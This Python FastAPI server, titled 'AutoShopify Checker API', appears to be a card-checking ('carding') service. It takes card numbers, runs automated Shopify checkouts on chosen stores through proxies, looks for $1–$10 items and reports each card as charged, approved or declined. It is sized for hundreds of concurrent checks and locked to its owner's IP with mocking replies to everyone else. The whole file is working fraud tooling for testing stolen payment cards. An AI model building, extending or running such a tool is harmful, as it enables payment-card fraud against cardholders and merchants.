from fastapi import FastAPI, Query, Request, HTTPException
from fastapi.responses import FileResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Optional
import asyncio
from concurrent.futures import ThreadPoolExecutor
import sys
import os
import logging
import random
from datetime import datetime

sys.path.insert(0, os.path.dirname(__file__))

from checker import run_checkout_low, run_checkout_for_card, normalize_proxy, CheckStatus

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ── Firewall Configuration ──────────────────────────────────────────────────
WHITELISTED_IPS = ["27.34.69.30", "2001:4860:7:80a::fa"]
TROLL_MESSAGES = [
    "kids even my grandpa code better",
    "nice try, go back to hello world",
    "access denied, buy a brain first",
    "your request is as empty as your skill",
    "stop sniffing, start learning",
    "unauthorized access? more like unauthorized existence",
    "bro really thought he could bypass this",
    "go play with legos, coding is for adults",
    "your IP is now in my 'clowns' list",
    "error 403: skill issue detected",
]

# ── Capacity (Railway Pro: 24 vCPU / 24 GB RAM per replica) ───────────────────
MAX_CONCURRENT_CHECKS = 300
THREAD_POOL_WORKERS   = 400

executor  = ThreadPoolExecutor(max_workers=THREAD_POOL_WORKERS)
semaphore = asyncio.Semaphore(MAX_CONCURRENT_CHECKS)

app = FastAPI(title="AutoShopify Checker API")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

# ── Firewall Middleware ──────────────────────────────────────────────────────
@app.middleware("http")
async def firewall_middleware(request: Request, call_next):
    # Get client IP (handle proxies if necessary)
    client_ip = request.client.host
    # Check for X-Forwarded-For header if behind a proxy like Railway/Cloudflare
    forwarded_for = request.headers.get("x-forwarded-for")
    if forwarded_for:
        client_ip = forwarded_for.split(",")[0].strip()
    
    user_agent = request.headers.get("user-agent", "Unknown")
    
    # Check Whitelist
    if client_ip not in WHITELISTED_IPS:
        logger.warning(f"BLOCKED ACCESS: IP={client_ip}, UA={user_agent}")
        
        # Generate random troll message repeated 25-30 times
        troll_base = random.choice(TROLL_MESSAGES)
        repeat_count = random.randint(25, 30)
        troll_payload = f"{troll_base} " * repeat_count
        
        return JSONResponse(
            status_code=403,
            content={
                "status": "Access Blocked",
                "message": troll_payload.strip(),
                "info": {
                    "your_ip": client_ip,
                    "your_device": user_agent,
                    "timestamp": datetime.now().isoformat(),
                    "note": "This API is strictly for the owner. Unauthorized access is logged."
                }
            }
        )
    
    return await call_next(request)

class CheckResponse(BaseModel):
    card:        str
    status:      str
    status_code: str
    amount:      str = ""
    currency:    str = "USD"
    site_name:   str
    gateway:     str = "Shopify Payments"
    receipt_url: str = ""
    error:       str = ""
    success:     bool
    checked_at:  str

stats = {"total": 0, "charged": 0, "declined": 0, "approved": 0, "error": 0}

def _is_network_error(err: str) -> bool:
    low = err.lower()
    return any(s in low for s in [
        "curl: (6)", "curl: (7)", "curl: (28)", "curl: (35)", "curl: (56)",
        "getaddrinfo", "connect tunnel", "failed to perform",
        "timed out", "connection timed out", "operation timed out",
        "connection closed abruptly", "could not resolve",
        "name or service not known",
    ])

def _is_no_variants(err: str) -> bool:
    return "no variants" in err.lower() or "variants in $" in err.lower()

def _attempt_low(shop_url, card, proxy_url):
    return run_checkout_low(shop_url=shop_url, card_entry=card, proxy_url=proxy_url)

def _attempt_any(shop_url, card, proxy_url):
    return run_checkout_for_card(shop_url=shop_url, card_entry=card, proxy_url=proxy_url)

def run_check_sync(card: str, shop_url: str, proxy: Optional[str] = None, low_amount: bool = True):
    try:
        proxy_url = ""
        if proxy:
            try:
                proxy_url = normalize_proxy(proxy)
            except Exception:
                proxy_url = proxy

        # Attempt 1: normal run
        result = _attempt_low(shop_url, card, proxy_url) if low_amount                  else _attempt_any(shop_url, card, proxy_url)
        err = str(getattr(result, "error", "") or "")

        # Attempt 2: network/DNS error with proxy → retry without proxy
        if proxy_url and getattr(result, "retryable", False) and _is_network_error(err):
            logger.info("Network error with proxy, retrying without proxy: %s", err[:100])
            result = _attempt_low(shop_url, card, "") if low_amount                      else _attempt_any(shop_url, card, "")
            err = str(getattr(result, "error", "") or "")

        # Attempt 3: network error without proxy → brief wait + one more retry
        if not proxy_url and getattr(result, "retryable", False) and _is_network_error(err):
            logger.info("Network error (no proxy), wait 1s + retry: %s", err[:100])
            import time; time.sleep(1.0)
            result = _attempt_low(shop_url, card, "") if low_amount                      else _attempt_any(shop_url, card, "")
            err = str(getattr(result, "error", "") or "")

        # Low mode: no $1-$10 variants → skip site cleanly (no $20-40 fallback)
        if low_amount and _is_no_variants(err):
            logger.info("No $1-$10 variants — site skipped")

        status_map = {
            CheckStatus.CHARGED:  "CHARGED",
            CheckStatus.APPROVED: "APPROVED",
            CheckStatus.DECLINED: "DECLINED",
            CheckStatus.ERROR:    "ERROR",
        }
        status_str = status_map.get(result.status, "ERROR")

        global stats
        stats["total"] += 1
        if result.status == CheckStatus.CHARGED:    stats["charged"]  += 1
        elif result.status == CheckStatus.APPROVED: stats["approved"] += 1
        elif result.status == CheckStatus.DECLINED: stats["declined"] += 1
        else:                                        stats["error"]    += 1

        return CheckResponse(
            card        = card,
            status      = status_str,
            status_code = getattr(result, "status_code", "") or "",
            amount      = getattr(result, "amount",      "") or "",
            currency    = getattr(result, "currency", "USD") or "USD",
            site_name   = getattr(result, "site_name",   "") or shop_url.split("//")[-1].split("/")[0],
            gateway     = "Shopify Payments",
            receipt_url = getattr(result, "receipt_url", "") or "",
            error       = err,
            success     = result.status in (CheckStatus.CHARGED, CheckStatus.APPROVED),
            checked_at  = datetime.now().isoformat(),
        )

    except Exception as e:
        return CheckResponse(
            card        = card,
            status      = "ERROR",
            status_code = "INTERNAL_ERROR",
            site_name   = shop_url.split("//")[-1].split("/")[0],
            gateway     = "Shopify Payments",
            error       = str(e),
            success     = False,
            checked_at  = datetime.now().isoformat(),
        )

@app.get("/")
async def root():
    return FileResponse("index.html", media_type="text/html")

@app.get("/check")
async def check_get(
    request: Request,
    card:  str           = Query(...),
    url:   str           = Query(..., alias="url"),
    proxy: Optional[str] = Query(None),
    low:   bool          = Query(True, alias="low"),
):
    async with semaphore:
        result = await asyncio.get_event_loop().run_in_executor(
            executor, run_check_sync, card, url, proxy, low
        )
        return result

@app.get("/health")
async def health():
    return {"status": "running", "stats": stats}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        app,
        host    = "0.0.0.0",
        port    = int(os.environ.get("PORT", 8000)),
        workers = 8,
    )
